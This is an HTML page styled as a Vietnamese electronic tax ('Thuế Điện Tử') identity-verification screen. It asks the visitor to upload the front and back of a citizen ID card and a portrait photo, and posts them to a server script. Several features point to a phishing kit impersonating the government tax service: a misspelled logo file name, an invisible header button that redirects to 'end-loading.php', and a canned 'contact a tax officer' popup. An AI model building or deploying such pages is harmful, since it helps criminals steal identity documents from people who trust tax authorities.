<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

    <link rel="stylesheet" href="../public/css/style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.1/css/all.min.css"
        integrity="sha512-5Hs3dF2AEPkpNAR7UiOHba+lRSJNeM2ECkwxUIxC1Q/FLycGTbNapWXB4tP889k5T5Ju8fs4b1P5z/iB4nMfSQ=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />

    <title>Thuế Điện Tử</title>
    <link rel="icon" type="image/png" href="../image/thuedinetu.png" sizes="32x32">


</head>
<!--<div id="alert-container" style="position: fixed; top: 20px; right: 20px; z-index: 1050;"></div>-->

<div id="alert-overlay"
    style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.5); z-index: 1049;">
</div>
<div id="alert-popup"
    style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 1050;"></div>

<div id="customConfirm" class="custom-confirm" style="display: none;">
    <div class="confirm-box">
        <p class="confirm-message">Chưa có thông tin kê khai vui lòng liên hệ cán bộ thuế để được hỗ trợ.</p>
        <button class="confirm-ok-btn">OK</button>
    </div>
</div>

<!-- Popup thông báo mới -->
<div id="customPopupCuoi" class="custom-popup-cuoi">
    <div class="custom-popup-content-cuoi">
        <span class="custom-close-btn-cuoi" id="closePopupCuoi">&times;</span>
        <div class="bg-white-cuoi">
            <p id="popupMessageCuoi">Thông báo sẽ hiển thị ở đây.</p>
            <button type="button" class="confirm-ok-btn mt-1" id="okButtonCuoi">Tiếp tục</button>
        </div>
    </div>
</div>



<header>
    <button class="header-button" onclick="window.location.href='end-loading.php'">ㅤㅤ</button>
</header>

<script src="../public/js/style.js"></script>
<div class="container">
    <div class="app-main">
        <div class="header-home">
            <div class="menu item-center flex">
                <a href="home.php"><i class="text-white fa-solid fa-angle-left"></i></a>
            </div>
            <div class="ml-2">
                <img width="80" src="../image/thuedinetu.png" alt="">
            </div>
            <div class="qr flex item-center">
                <i class="text-white fa-solid fa-house"></i>
            </div>
        </div>
        <div class="list-bank bg-white">
            <h2 class="mb-1">Định danh</h2>
            <form class="form-upload" id="uploadForm" enctype="multipart/form-data">
                <div class="sp mt-1">
                    <label>Tải lên CCCD mặt trước:</label>
                    <div class="upload-wrapper">
                        <input type="file" name="image1" id="image1" accept="image/*" required
                            onchange="previewImage(event, 'preview1')">
                        <button type="button" class="btn-up" onclick="document.getElementById('image1').click()">Chọn
                            ảnh</button>
                        <img id="preview1" class="preview-image" alt="Ảnh xem trước 1">
                    </div>
                </div>
                <div class="sp mt-1">
                    <label>Tải lên CCCD mặt sau:</label>
                    <div class="upload-wrapper">
                        <input type="file" name="image2" id="image2" accept="image/*" required
                            onchange="previewImage(event, 'preview2')">
                        <button type="button" class="btn-up" onclick="document.getElementById('image2').click()">Chọn
                            ảnh</button>
                        <img id="preview2" class="preview-image" alt="Ảnh xem trước 2">
                    </div>
                </div>
                <div class="sp mt-1">
                    <label>Tải lên ảnh chân dung:</label>
                    <div class="upload-wrapper">
                        <input type="file" name="image3" id="image3" accept="image/*" required
                            onchange="previewImage(event, 'preview3')">
                        <button type="button" class="btn-up" onclick="document.getElementById('image3').click()">Chọn
                            ảnh</button>
                        <img id="preview3" class="preview-image" alt="Ảnh xem trước 3">
                    </div>
                </div>
                <button class="btn-info mt-1" type="submit">Tải lên</button>
            </form>
        </div>

    </div>
</div>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
    $(document).ready(function () {
        $("#uploadForm").on("submit", function (event) {
            event.preventDefault();
            let formData = new FormData(this);
            $.ajax({
                url: "upload-images.php",
                type: "POST",
                data: formData,
                processData: false,
                contentType: false,
                success: function (response) {
                    alert("Tải ảnh lên thành công!");
                    location.reload();
                },
                error: function () {
                    alert("Đã xảy ra lỗi khi tải ảnh lên. Vui lòng thử lại.");
                }
            });
        });
    });
</script>